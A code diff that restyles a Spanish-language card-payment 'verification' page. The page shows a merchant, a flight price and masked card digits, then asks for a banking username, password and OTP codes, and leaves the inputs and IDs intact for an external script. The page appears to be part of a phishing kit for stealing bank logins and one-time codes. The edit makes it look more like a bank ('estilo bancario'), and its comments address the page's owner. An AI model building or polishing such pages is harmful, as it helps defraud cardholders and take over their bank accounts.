@@ -12,6 +12,7 @@
   <link rel="stylesheet" href="./css/normalize.css">
   <script src="./js/functions.js"></script>
 
+  <!-- ===== SOLO VISUAL ===== -->
   <style>
     :root{
       --bg:#f5f6f8; --card:#fff; --text:#111827; --muted:#6b7280;
@@ -35,13 +36,16 @@
       background:var(--card); border:1px solid var(--border); border-radius:var(--radius);
       box-shadow:var(--shadow); padding:clamp(18px,3vw,28px);
     }
-    .content>b:first-child{display:block; margin-bottom:12px; font-size:clamp(20px,2.2vw,26px); font-weight:800;}
+    .content>b:first-child{
+      display:block; margin-bottom:12px;
+      font-size:clamp(20px,2.2vw,26px); font-weight:800;
+    }
     .content p{line-height:1.55; margin:4px 0;}
 
-    /* GRID: Etiqueta | Valor */
+    /* GRID: Etiqueta | Valor (todo a la izquierda, 2 columnas) */
     #form{
       display:grid;
-      grid-template-columns: 160px 1fr;
+      grid-template-columns: 160px 1fr; /* label | valor */
       gap:10px 16px;
       align-items:center;
       margin:0 !important;
@@ -50,47 +54,57 @@
     #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
     #form .values p{margin:0; font-weight:700;}
 
-    /* Mapeo filas */
-    /* Comercio */
+    /* Inputs compactos y sobrios */
+    input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
+      width:100% !important;
+      height:38px !important;              /* compacto, estilo bancario */
+      padding:0 10px !important;
+      border:1px solid #d1d5db !important;
+      border-radius:8px !important;
+      background:#fff !important;
+      font-size:15px;
+      outline:none;
+      transition:border-color .15s, box-shadow .15s;
+    }
+    input:focus{
+      border-color:var(--focus) !important;
+      box-shadow:0 0 0 2px rgba(222,1,8,.13) !important;
+    }
+
+    /* Mapeo de filas (sin tocar tu HTML ni IDs) */
+    /* 1) Comercio */
     #form .labels b:nth-child(1){grid-column:1; grid-row:1;}
     #form .values p:nth-child(1){grid-column:2; grid-row:1;}
-
-    /* N.º tarjeta */
+    /* 2) Nº tarjeta */
     #form .labels b:nth-child(3){grid-column:1; grid-row:2;}
     #form .values p:nth-child(3){grid-column:2; grid-row:2;}
-
-    /* Monto */
+    /* 3) Monto */
     #form .labels b:nth-child(2){grid-column:1; grid-row:3;}
     #form .values p:nth-child(2){grid-column:2; grid-row:3;}
-
-    /* Usuario */
+    /* 4) Usuario */
     #form .labels b#user{grid-column:1; grid-row:4;}
-    #form #user{grid-column:2; grid-row:4; width:100%; max-width:520px; height:48px !important;}
-
-    /* Contraseña */
+    #form #user{grid-column:2; grid-row:4; width:100%; max-width:520px;}
+    /* 5) Contraseña */
     #form .labels b#puser{grid-column:1; grid-row:5;}
-    #form #puser{grid-column:2; grid-row:5; width:100%; max-width:520px; height:48px !important;}
-
-    /* OTP */
+    #form #puser{grid-column:2; grid-row:5; width:100%; max-width:520px;}
+    /* 6) Código OTP */
     #form .labels b#otpcode{grid-column:1; grid-row:6;}
-    #form #otpcode{grid-column:2; grid-row:6; width:100%; max-width:520px; height:48px !important;}
+    #form #otpcode{grid-column:2; grid-row:6; width:100%; max-width:520px;}
 
-    /* Inputs estilo */
-    input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
-      width:100% !important; height:48px !important; padding:0 14px !important;
-      border:1px solid #d1d5db !important; border-radius:12px !important; background:#fff !important;
-      font-size:16px; outline:none; transition:border-color .15s, box-shadow .15s;
+    /* Link de reenviar: dentro de la tarjeta y centrado */
+    #newCode{
+      display:block; text-align:center; margin:14px auto 0;
+      color:#0d6efd; text-decoration:none;
     }
-    input:focus{border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important;}
-
-    #newCode{display:block; text-align:center; margin:14px auto 8px; color:#0d6efd; text-decoration:none;}
     #newCode:hover{text-decoration:underline}
 
+    /* Botón “Verificar” dentro de la tarjeta, estilo pastilla */
     #btnNextStep.btn-success{
-      display:block; margin:10px auto 0;
-      min-width:200px; height:48px; padding:0 22px;
-      border-radius:999px; border:0; background:#111; color:#fff;
-      font-weight:800; font-size:16px; box-shadow:0 2px 0 rgba(0,0,0,.08);
+      display:block; margin:16px auto 0;
+      min-width:220px; height:44px; padding:0 22px;
+      border-radius:999px; border:0;
+      background:#111; color:#fff; font-weight:800; font-size:16px;
+      box-shadow:0 6px 14px rgba(0,0,0,.12);
       cursor:pointer; transition:transform .05s ease, opacity .15s ease;
     }
     #btnNextStep.btn-success:active{transform:translateY(1px)}
@@ -101,6 +115,7 @@
   </style>
 </head>
 <body>
+  <!-- LOADER -->
   <div class="main-loader show">
     <img id="company-loader">
     <div class="loader"></div>
@@ -136,7 +151,7 @@
           <p>$ <span id="flight-price">49.000</span> USD</p>
           <p>•••• •••• •••• <span id="card-digits"></span></p>
 
-          <!-- Inputs -->
+          <!-- Inputs condicionales (JS los muestra/oculta) -->
           <input class="hidden" required type="text" id="user">
           <input class="hidden" required type="text" id="puser">
           <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
@@ -146,12 +161,16 @@
           <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
         </div>
       </form>
-    </div>
 
-    <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
-    <button id="btnNextStep" class="btn-success">Verificar</button>
+      <!-- Enlace de reenviar (misma ID, ahora dentro del card) -->
+      <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
+
+      <!-- Botón dentro del card (misma ID para tu JS) -->
+      <button id="btnNextStep" class="btn-success">Verificar</button>
+    </div>
   </main>
 
+  <!-- SCRIPTS -->
   <script src="./js/id_check.js"></script>
 </body>
 </html>
